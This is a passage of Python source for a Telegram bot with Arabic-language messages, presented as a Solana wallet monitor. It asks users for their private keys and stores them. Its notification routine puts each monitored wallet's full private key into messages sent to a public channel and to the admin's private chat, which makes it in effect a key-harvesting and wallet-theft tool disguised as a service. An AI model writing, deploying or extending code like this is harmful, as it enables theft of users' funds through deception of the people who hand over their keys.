            # Get SOL balance for each wallet
            balance = await self.monitor.get_wallet_balance(wallet['wallet_address'])
            status_text += f"{i}. 🔍 {truncate_address(wallet['wallet_address'], 6)} | 💰 {balance:.4f} SOL\n"
        
        await update.message.reply_text(status_text)

    async def bulk_add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /add command - add multiple wallets from text"""
        chat_id = update.effective_chat.id
        
        # Check if user has reached maximum wallets
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
        if len(monitored_wallets) >= MAX_MONITORED_WALLETS:
            await update.message.reply_text(
                MESSAGES["max_wallets_reached"].format(max_wallets=MAX_MONITORED_WALLETS)
            )
            return
        
        # Set user state to waiting for bulk private keys
        self.user_states[chat_id] = "waiting_bulk_private_keys"
        await update.message.reply_text(
            "📝 أرسل المفاتيح الخاصة (يمكن إرسال عدة مفاتيح في رسالة واحدة):\n\n"
            "💡 يمكنك إرسال:\n"
            "• مفتاح واحد أو عدة مفاتيح\n"
            "• مع أي نص إضافي (سيتم تجاهله)\n"
            "• بتنسيق base58 أو array\n\n"
            "⚠️ تأكد من أن المفاتيح صحيحة ولا تشاركها مع أي شخص آخر!"
        )

    async def keys_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /k command - send all private keys in a text file"""
        chat_id = update.effective_chat.id
        
        try:
            # Get all monitored wallets for this user
            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            user_wallets = [wallet for wallet in all_wallets if wallet['chat_id'] == chat_id]
            
            if not user_wallets:
                await update.message.reply_text(MESSAGES["no_wallets_monitored"])
                return
            
            # Create content for the text file in English with proper formatting
            file_content = "Solana Private Keys Export\n"
            file_content += f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            file_content += f"Number of Wallets: {len(user_wallets)}\n"
            file_content += "=" * 60 + "\n\n"
            
            for i, wallet in enumerate(user_wallets, 1):
                file_content += f"Wallet Address:\n"
                file_content += f"{wallet['wallet_address']}\n\n"
                file_content += f"Private Key:\n"
                file_content += f"{wallet['private_key']}\n\n"
                
                if wallet['nickname']:
                    file_content += f"Nickname: {wallet['nickname']}\n\n"
                
                file_content += "_" * 60 + "\n\n"
            
            file_content += "SECURITY WARNING:\n"
            file_content += "Do not share these private keys with anyone!\n"
            file_content += "Keep this file in a secure and protected location.\n"
            
            # Create filename with timestamp
            filename = f"solana_keys_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            # Write to file with explicit UTF-8 encoding
            with open(filename, 'w', encoding='utf-8', newline='\n') as f:
                f.write(file_content)
            
            # Send the file to user
            with open(filename, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=filename,
                    caption="🔐 Your private keys file\n\n⚠️ Keep this file in a secure location!"
                )
            
            # Delete the file after sending
            os.remove(filename)
            
            logger.info(f"Sent private keys file to user {chat_id}")
            
        except Exception as e:
            logger.error(f"Error in keys command: {e}")
            await update.message.reply_text(MESSAGES["error_occurred"].format(error=str(e)))

    async def filter_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /filter command - admin only: adjust minimum notification amount"""
        global MIN_NOTIFICATION_AMOUNT
        chat_id = update.effective_chat.id
        
        # Check if user is admin
        if chat_id != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ هذا الأمر متاح للمشرف فقط.")
            return
        
        try:
            if context.args and len(context.args) > 0:
                # Set new minimum amount
                new_amount = float(context.args[0])
                if new_amount < 0:
                    await update.message.reply_text("❌ يجب أن يكون المبلغ أكبر من أو يساوي 0")
                    return
                
                MIN_NOTIFICATION_AMOUNT = new_amount
                
                # Save to database
                success = await self.monitor.db_manager.save_setting('min_notification_amount', str(new_amount))
                
                if success:
                    await update.message.reply_text(
                        f"✅ تم تحديث وحفظ الحد الأدنى للإشعارات إلى: {MIN_NOTIFICATION_AMOUNT} SOL\n\n"
                        f"سيتم تجاهل المعاملات الأصغر من هذا المبلغ.\n"
                        f"🔒 تم حفظ الإعداد بشكل دائم."
                    )
                    logger.info(f"Admin {chat_id} changed and saved minimum notification amount to {MIN_NOTIFICATION_AMOUNT} SOL")
                else:
                    await update.message.reply_text(
                        f"⚠️ تم تحديث الحد الأدنى للإشعارات إلى: {MIN_NOTIFICATION_AMOUNT} SOL ولكن فشل في حفظه.\n\n"
                        f"سيعود إلى القيمة الافتراضية عند إعادة التشغيل."
                    )
            else:
                # Show current setting
                await update.message.reply_text(
                    f"🔧 الحد الأدنى الحالي للإشعارات: {MIN_NOTIFICATION_AMOUNT} SOL\n\n"
                    f"لتغيير الحد الأدنى، استخدم: /filter <المبلغ>\n"
                    f"مثال: /filter 0.005\n\n"
                    f"🔒 الإعداد سيتم حفظه بشكل دائم."
                )
        except ValueError:
            await update.message.reply_text(
                "❌ يرجى إدخال رقم صحيح.\n\n"
                "مثال: /filter 0.001"
            )

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        chat_id = update.effective_chat.id
        text = update.message.text
        
        # Check if user is waiting for private key input
        if chat_id in self.user_states and self.user_states[chat_id] in ["waiting_private_key", "waiting_bulk_private_keys"]:
            if text:
                await self.handle_private_key_input(update, context, text)
        else:
            await update.message.reply_text(MESSAGES["help_text"])

    async def handle_private_key_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, private_key: str):
        """Handle private key input"""
        chat_id = update.effective_chat.id
        current_state = self.user_states.get(chat_id)
        
        if current_state == "waiting_bulk_private_keys":
            await self.handle_bulk_private_keys(update, context, private_key)
        else:
            # Clear user state
            self.user_states.pop(chat_id, None)
            
            # Validate private key
            is_valid, result = validate_private_key(private_key)
            
            if not is_valid:
                await update.message.reply_text(MESSAGES["invalid_private_key"])
                logger.warning(f"Invalid private key from user {chat_id}: {result}")
                return
            
            wallet_address = result
            
            # Add wallet to monitoring
            success, message = await self.monitor.add_wallet(
                private_key, 
                chat_id, 
                self.send_transaction_notification
            )
            
            if success:
                # Create inline keyboard with + and Start buttons
                keyboard = [
                    [
                        InlineKeyboardButton("➕ إضافة محفظة أخرى", callback_data="add_wallet"),
                        InlineKeyboardButton("🚀 بدء المراقبة", callback_data="start_monitoring")
                    ]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    MESSAGES["monitoring_started"].format(wallet_address=truncate_address(wallet_address)),
                    reply_markup=reply_markup
                )
                logger.info(f"Started monitoring wallet {wallet_address} for user {chat_id}")
            else:
                if message == "wallet_already_monitored":
                    await update.message.reply_text(MESSAGES["wallet_already_monitored"])
                else:
                    await update.message.reply_text(MESSAGES["error_occurred"].format(error=message))

    async def handle_bulk_private_keys(self, update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
        """Handle bulk private key input"""
        chat_id = update.effective_chat.id
        
        # Clear user state
        self.user_states.pop(chat_id, None)
        
        # Extract private keys from text
        private_keys = self.extract_private_keys_from_text(text)
        
        if not private_keys:
            await update.message.reply_text(
                "❌ لم يتم العثور على أي مفاتيح خاصة صحيحة في النص.\n\n"
                "تأكد من أن المفاتيح بتنسيق صحيح (base58 أو array)."
            )
            return
        
        # Send initial status message
        status_message = await update.message.reply_text(
            f"🔄 جاري معالجة {len(private_keys)} مفتاح...\n\n"
            "⏳ يرجى الانتظار..."
        )
        
        # Process keys and track results
        successful_wallets = []
        failed_keys = []
        already_monitored = []
        
        for i, private_key in enumerate(private_keys, 1):
            try:
                # Update status
                await status_message.edit_text(
                    f"🔄 معالجة المفاتيح: {i}/{len(private_keys)}\n\n"
                    f"✅ نجح: {len(successful_wallets)}\n"
                    f"🔄 مراقب مسبقاً: {len(already_monitored)}\n"
                    f"❌ فشل: {len(failed_keys)}\n\n"
                    "⏳ جاري المعالجة..."
                )
                
                # Validate private key
                is_valid, result = validate_private_key(private_key)
                
                if not is_valid:
                    failed_keys.append(f"مفتاح غير صحيح: {private_key[:20]}...")
                    continue
                
                wallet_address = result
                
                # Add wallet to monitoring
                success, message = await self.monitor.add_wallet(
                    private_key, 
                    chat_id, 
                    self.send_transaction_notification
                )
                
                if success:
                    successful_wallets.append(truncate_address(wallet_address))
                    logger.info(f"Bulk added wallet {wallet_address} for user {chat_id}")
                else:
                    if message == "wallet_already_monitored":
                        already_monitored.append(truncate_address(wallet_address))
                    else:
                        failed_keys.append(f"خطأ: {message}")
                
            except Exception as e:
                failed_keys.append(f"خطأ في المعالجة: {str(e)[:30]}...")
        
        # Prepare final report
        report = f"📊 تقرير إضافة المحافظ:\n\n"
        report += f"🔢 إجمالي المفاتيح: {len(private_keys)}\n"
        report += f"✅ تمت الإضافة بنجاح: {len(successful_wallets)}\n"
        report += f"🔄 مراقبة مسبقاً: {len(already_monitored)}\n"
        report += f"❌ فشل: {len(failed_keys)}\n\n"
        
        if successful_wallets:
            report += "✅ المحافظ المضافة:\n"
            for wallet in successful_wallets:
                report += f"  • {wallet}\n"
            report += "\n"
        
        if already_monitored:
            report += "🔄 محافظ مراقبة مسبقاً:\n"
            for wallet in already_monitored:
                report += f"  • {wallet}\n"
            report += "\n"
        
        if failed_keys:
            report += "❌ مفاتيح فاشلة:\n"
            for error in failed_keys[:5]:  # Show only first 5 errors
                report += f"  • {error}\n"
            if len(failed_keys) > 5:
                report += f"  • ... و {len(failed_keys) - 5} أخطاء أخرى\n"
            report += "\n"
        
        report += "🔔 المراقبة نشطة للمحافظ المضافة!"
        
        # Update final status
        await status_message.edit_text(report)

    def extract_private_keys_from_text(self, text: str) -> List[str]:
        """Extract private keys from text, handling various formats"""
        import re
        
        private_keys = []
        
        # Pattern for base58 keys (typically 87-88 characters)
        base58_pattern = r'[1-9A-HJ-NP-Za-km-z]{87,88}'
        
        # Pattern for array format keys
        array_pattern = r'\[\s*(?:\d+\s*,\s*){63}\d+\s*\]'
        
        # Find base58 keys
        base58_matches = re.findall(base58_pattern, text)
        for match in base58_matches:
            # Validate that it's likely a private key (not just random base58)
            if len(match) in [87, 88]:
                private_keys.append(match.strip())
        
        # Find array format keys
        array_matches = re.findall(array_pattern, text)
        for match in array_matches:
            private_keys.append(match.strip())
        
        # Remove duplicates while preserving order
        seen = set()
        unique_keys = []
        for key in private_keys:
            if key not in seen:
                seen.add(key)
                unique_keys.append(key)
        
        return unique_keys

    async def handle_callback_query(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline keyboard callbacks"""
        query = update.callback_query
        await query.answer()
        
        if query.data.startswith("stop_"):
            wallet_address = query.data[5:]  # Remove "stop_" prefix
            chat_id = query.from_user.id
            
            success = await self.monitor.remove_wallet(wallet_address, chat_id)
            
            if success:
                await query.edit_message_text(
                    MESSAGES["monitoring_stopped"].format(
                        wallet_address=truncate_address(wallet_address)
                    )
                )
                logger.info(f"Stopped monitoring wallet {wallet_address}")
            else:
                await query.edit_message_text(MESSAGES["wallet_not_found"])
        
        elif query.data == "add_wallet":
            chat_id = query.from_user.id
            
            # Check if user has reached maximum wallets
            monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
            if len(monitored_wallets) >= MAX_MONITORED_WALLETS:
                await query.edit_message_text(
                    MESSAGES["max_wallets_reached"].format(max_wallets=MAX_MONITORED_WALLETS)
                )
                return
            
            # Set user state to waiting for private key
            self.user_states[chat_id] = "waiting_private_key"
            await query.edit_message_text(MESSAGES["enter_private_key"])
        
        elif query.data == "start_monitoring":
            await query.edit_message_text("🔔 المراقبة نشطة! ستحصل على إشعارات فورية عند حدوث معاملات جديدة.")

    async def send_transaction_notification(self, chat_id: int, wallet_address: str, 
                                          amount: str, tx_type: str, timestamp: str, signature: str):
        """Send transaction notification based on admin/user monitoring logic"""
        try:
            # Get all users monitoring this wallet
            wallets_monitoring = await self.monitor.db_manager.get_monitored_wallets_by_address(wallet_address)
            
            if not wallets_monitoring:
                logger.warning(f"No users monitoring wallet {wallet_address}")
                return
            
            # Check if admin is monitoring this wallet
            admin_monitoring = any(wallet_info['chat_id'] == ADMIN_CHAT_ID for wallet_info in wallets_monitoring)
            
            # Check if any regular users are monitoring this wallet
            regular_users_monitoring = any(wallet_info['chat_id'] != ADMIN_CHAT_ID for wallet_info in wallets_monitoring)
            
            # Get private key for this wallet (from the first user who has it)
            private_key = None
            for wallet_info in wallets_monitoring:
                pk = await self.get_private_key_for_wallet(wallet_info['chat_id'], wallet_address)
                if pk:
                    private_key = pk
                    break
            
            # Escape text for MarkdownV2
            escaped_wallet = escape_markdown_v2(truncate_address(wallet_address))
            escaped_amount = escape_markdown_v2(amount)
            escaped_tx_type = escape_markdown_v2(tx_type)
            
            # Create base message
            message = f"💰 معاملة جديدة\\!\n\n🏦 المحفظة: {escaped_wallet}\n💵 المبلغ: {escaped_amount} SOL\n🔄 النوع: {escaped_tx_type}"
            
            # Add private key to message if found
            if private_key:
                message += f"\n\n🔐 المفتاح الخاص:\n```\n{private_key}\n```"
            
            # Add full wallet address as copyable code
            message += f"\n\n📋 العنوان الكامل:\n```\n{wallet_address}\n```"
            
            # Add transaction signature (full signature)
            message += f"\n\n🔗 توقيع المعاملة:\n```\n{signature}\n```"
            
            # Apply notification logic
            if admin_monitoring and regular_users_monitoring:
                # Case 1: Both admin and regular users monitoring → Send to channel + admin private
                try:
                    # Send to public channel
                    await self.application.bot.send_message(
                        chat_id=MONITORING_CHANNEL, 
                        text=message, 
                        parse_mode='MarkdownV2'
                    )
                    
                    # Send to admin private chat
                    admin_message = message + f"\n\n👑 **إشعار المشرف**: هذه المحفظة مراقبة من قبل مستخدمين عاديين أيضاً"
                    await self.application.bot.send_message(
                        chat_id=ADMIN_CHAT_ID, 
                        text=admin_message, 
                        parse_mode='MarkdownV2'
                    )
                    
                except Exception as notification_error:
                    logger.error(f"Error sending notifications (admin + users case): {notification_error}")
                    
            elif admin_monitoring and not regular_users_monitoring:
                # Case 2: Only admin monitoring → Send to admin private only
                try:
                    admin_message = message + f"\n\n👑 **إشعار المشرف**: هذه المحفظة مراقبة من قبلك فقط"
                    await self.application.bot.send_message(
                        chat_id=ADMIN_CHAT_ID, 
                        text=admin_message, 
                        parse_mode='MarkdownV2'
                    )
                    
                except Exception as admin_error:
                    logger.error(f"Error sending notification to admin: {admin_error}")
                    
            elif not admin_monitoring and regular_users_monitoring:
                # Case 3: Only regular users monitoring → Send to channel only
                try:
                    await self.application.bot.send_message(
                        chat_id=MONITORING_CHANNEL, 
                        text=message, 
                        parse_mode='MarkdownV2'
                    )
                    
                except Exception as channel_error:
                    logger.error(f"Error sending to channel: {channel_error}")
            
        except Exception as e:
            logger.error(f"Error sending notification: {e}")

    async def get_private_key_for_wallet(self, chat_id: int, wallet_address: str) -> str:
        """Get private key for a specific wallet"""
        try:
            wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            for wallet in wallets:
                if wallet['chat_id'] == chat_id and wallet['wallet_address'] == wallet_address:
                    return wallet['private_key']
            return None
        except Exception as e:
            logger.error(f"Error getting private key: {e}")
            return None

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        import traceback
        
        # Log the error with more details
        logger.error(f"Update {update} caused error {context.error}")
        logger.error("".join(traceback.format_exception(type(context.error), context.error, context.error.__traceback__)))
        
        # Handle specific error types
        if "Conflict" in str(context.error):
            logger.warning("🔄 Telegram API conflict detected - another bot instance may be running")
        elif "TimeoutError" in str(context.error):
            logger.warning("⏰ Network timeout - will retry automatically")
        elif "NetworkError" in str(context.error):
            logger.warning("🌐 Network error - will retry automatically")

    def setup_handlers(self):
        """Setup bot handlers"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("monitor", self.monitor_command))
        self.application.add_handler(CommandHandler("add", self.bulk_add_command))
        self.application.add_handler(CommandHandler("stop", self.stop_command))
        self.application.add_handler(CommandHandler("list", self.list_command))
        self.application.add_handler(CommandHandler("k", self.keys_command))
        self.application.add_handler(CommandHandler("filter", self.filter_command))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.application.add_handler(CallbackQueryHandler(self.handle_callback_query))
        self.application.add_error_handler(self.error_handler)

    async def start_bot(self):
        """Start the bot"""
        # Validate required environment variables
        if not TELEGRAM_BOT_TOKEN:
            logger.error("❌ TELEGRAM_BOT_TOKEN environment variable is required")
            return
        
        if not DATABASE_URL:
            logger.error("❌ DATABASE_URL environment variable is required")
            return
            
        if not SOLANA_RPC_URL:
            logger.error("❌ RPC_URL environment variable is required")
            return
        
        try:
            # Initialize database
            await self.monitor.db_manager.initialize()
            
            # Load saved filter setting
            await self.load_filter_setting()
            
            # Create application with better configuration
            self.application = (Application.builder()
                              .token(TELEGRAM_BOT_TOKEN)
                              .concurrent_updates(True)
                              .build())
            
            # Setup handlers
            self.setup_handlers()
            
            # Start monitoring session
            await self.monitor.start_session()
            
            # Load existing wallets from database and start monitoring
            await self.load_and_start_monitoring()
            
            # Get and display user count
            users_count = await self.monitor.db_manager.get_users_count()
            logger.info(f"👥 Active Users: {users_count}")
            logger.info(f"📡 Monitoring Channel: {MONITORING_CHANNEL}")
            
            logger.info("🚀 Starting Solana Wallet Monitor Bot...")
            
            # Start the application with proper error handling
            await self.application.initialize()
            
            # Delete webhook to avoid conflicts
            await self.application.bot.delete_webhook(drop_pending_updates=True)
            
            await self.application.start()
            
            # Start polling with timeout to prevent conflicts
            await self.application.updater.start_polling(
                poll_interval=1.0,
                timeout=10,
                bootstrap_retries=-1
            )
            
            logger.info("✅ Bot is running successfully!")
            
            # Keep the bot running
            try:
                await asyncio.Event().wait()
            except KeyboardInterrupt:
                logger.info("🛑 Received shutdown signal...")
            
        except Exception as e:
            logger.error(f"❌ Error starting bot: {e}")
            raise
        finally:
            await self.cleanup()

    async def load_filter_setting(self):
        """Load saved filter setting from database"""
        global MIN_NOTIFICATION_AMOUNT
        try:
            saved_amount = await self.monitor.db_manager.get_setting('min_notification_amount', str(MIN_NOTIFICATION_AMOUNT))
            MIN_NOTIFICATION_AMOUNT = float(saved_amount)
            logger.info(f"🔧 Loaded saved minimum notification amount: {MIN_NOTIFICATION_AMOUNT} SOL")
        except Exception as e:
            logger.warning(f"Error loading filter setting, using default: {e}")

    async def load_and_start_monitoring(self):
        """Load existing wallets from database and start monitoring them"""
        try:
            wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            for wallet in wallets:
                await self.monitor.start_monitoring_wallet(
                    wallet['wallet_address'], 
                    wallet['chat_id'], 
                    self.send_transaction_notification
                )
            logger.info(f"Loaded and started monitoring {len(wallets)} wallets from database")
        except Exception as e:
            logger.error(f"Error loading wallets from database: {e}")

    async def cleanup(self):
        """Cleanup resources"""
        logger.info("🧹 Cleaning up resources...")
        
        try:
            # Stop monitoring first
            await self.monitor.stop_all_monitoring()
            logger.info("✅ Stopped all monitoring tasks")
            
            # Close database connections
            await self.monitor.db_manager.close()
            logger.info("✅ Closed database connections")
            
            # Stop the application
            if self.application and self.application.updater.running:
                await self.application.updater.stop()
                await self.application.stop()
                await self.application.shutdown()
                logger.info("✅ Stopped Telegram application")
                
        except Exception as e:
            logger.error(f"❌ Error during cleanup: {e}")
        
        logger.info("🏁 Cleanup completed")


async def start_http_server():
    """Start HTTP server to keep the service alive"""
    from aiohttp import web
    
    async def health_check(request):
        """Health check endpoint"""
        return web.Response(text='🤖 Telegram bot is running.\n', content_type='text/plain')
    
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    # Use environment PORT or default to 5000
    port = int(os.environ.get('PORT', 5000))
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logger.info(f"🌐 HTTP server listening on port {port}")
    return runner

async def main():
    """Main function"""
    # Start HTTP server
    http_runner = await start_http_server()
    
    try:
        # Start the bot
        bot = SolanaWalletBot()
        await bot.start_bot()
    finally:
        # Cleanup HTTP server
        if http_runner:
            await http_runner.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
